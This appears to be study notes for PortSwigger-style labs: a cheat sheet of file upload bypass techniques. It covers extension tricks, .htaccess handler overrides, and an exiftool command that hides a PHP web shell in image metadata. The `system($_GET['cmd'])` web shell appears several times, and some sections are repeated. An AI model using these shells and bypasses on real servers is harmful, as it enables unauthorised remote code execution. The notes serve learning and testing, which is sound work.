# File Upload Vulnerabilities

## 1. Extension Filter Bypass
- Double extension: `shell.php.jpg`
- Null byte: `shell.php%00.jpg`
- Case manipulation: `shell.PhP`
- Alternate extensions: `.phtml`, `.php5`, `.phar`
- Custom extension via `.htaccess`: `AddType application/x-httpd-php .l33t`

## 2. HTTP Request Bypass
- Content-Type manipulation
- Magic bytes injection
- Double extension parsing order

## 3. Server-Side Execution
- Web-accessible directory + execute permissions required
- Payload: `<?php echo system($_GET['cmd']); ?>`

## 4. .htaccess Exploitation
```apache
AddHandler application/x-httpd-php .htaccess
AddType application/x-httpd-php .l33t
```
## 5. EXIF Exploitation
**Embed PHP in image metadata:**
```bash
exiftool -Comment='<?php echo system($_GET["cmd"]); ?>' image.jpg
```
Alternative payload:

```php
GIF89a;
<?php system($_GET['cmd']); ?>
```
## 6. .htaccess Exploitation

Override default configurations:

apache
AddHandler application/x-httpd-php .htaccess
AddType application/x-httpd-php .l33t
## 7. Server-Side Execution

Requirements:

Web accessible directory
Execute permissions
Server misconfiguration
Test payload:

```php
<?php echo system($_GET['cmd']); ?>
```
Takeaways

Chain bypasses: extension → MIME → execution
Test multiple methods per server
Practice on PortSwigger labs
